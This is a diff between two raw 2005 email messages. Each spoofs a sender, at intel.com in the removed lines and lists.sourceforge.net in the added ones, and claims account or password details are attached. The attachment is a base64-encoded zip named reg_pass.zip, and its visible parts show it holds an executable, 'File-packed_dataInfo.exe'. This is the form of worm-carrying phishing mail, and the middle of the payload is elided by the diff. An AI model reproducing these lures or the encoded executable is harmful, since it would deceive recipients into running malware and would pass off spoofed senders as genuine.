@@ -1,29 +1,29 @@
-From: office@intel.com
-Subject: Registration_Confirmation
-Date: Mon, 28 Nov 2005 05:55:09 UTC
-Message-ID: <cc8f2b.6a34c05ef4@intel.com>
+From: office@lists.sourceforge.net
+Subject: Your Password
+Date: Mon, 28 Nov 2005 09:22:12 UTC
+Message-ID: <1b26cfd7a228839eae@lists.sourceforge.net>
 Mime-Version: 1.0
-Content-Type: multipart/mixed; boundary="=023a10de01a3b"
+Content-Type: multipart/mixed; boundary="=====ccbeaf5fb75.d2d1"
 Content-Transfer-Encoding: 7bit
 Return-path: <netdev-bounce@oss.sgi.com>
-To: XFreeMail@oss.sgi.com
+To: rbh00@oss.sgi.com
 Sender: netdev-bounce@oss.sgi.com
 Errors-to: netdev-bounce@oss.sgi.com
 List-Id: netdev.vger.kernel.org
 
 This is a multi-part message in MIME format.
 
---=023a10de01a3b
+--=====ccbeaf5fb75.d2d1
 
-Account and Password Information are attached!
+Protected message is attached!
 
 
-***** Go to: http://www.intel.com
-***** Email: postman@intel.com
---=023a10de01a3b
-Content-Type: application/octet-stream; name=reg_pass-data.zip
+***** Go to: http://www.lists.sourceforge.net
+***** Email: postman@lists.sourceforge.net
+--=====ccbeaf5fb75.d2d1
+Content-Type: application/octet-stream; name=reg_pass.zip
 Content-Transfer-Encoding: base64
-Content-Disposition: attachment; filename="reg_pass-data.zip"
+Content-Disposition: attachment; filename="reg_pass.zip"
 
 UEsDBAoAAAAAAACQdjPMyus3XtgAAF7YAAAYAAAARmlsZS1wYWNrZWRfZGF0YUluZm8uZXhlTVqQ
 AAMAAAAEAAAA//8AALgAAAAAAAAAQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
@@ -1000,4 +1000,4 @@ RmhMTDZoTEwxTExoVExYVlBYaCQ7ekwyaEUpUjlSekJoRXpXaEUpUjlyemhFKVI5cnpCaExEU1M2
 aFlFKVIgYkM0dmgxU1BMWEwwUlZoMVNQTFgxMWgxU1BMWHIxaHpYYlBLAQIUAAoAAAAAAACQdjPM
 yus3XtgAAF7YAAAYAAAAAAAAAAAAIAD/gQAAAABGaWxlLXBhY2tlZF9kYXRhSW5mby5leGVQSwUG
 AAAAAAEAAQBGAAAAlNgAAAAA
---=023a10de01a3b--
+--=====ccbeaf5fb75.d2d1--
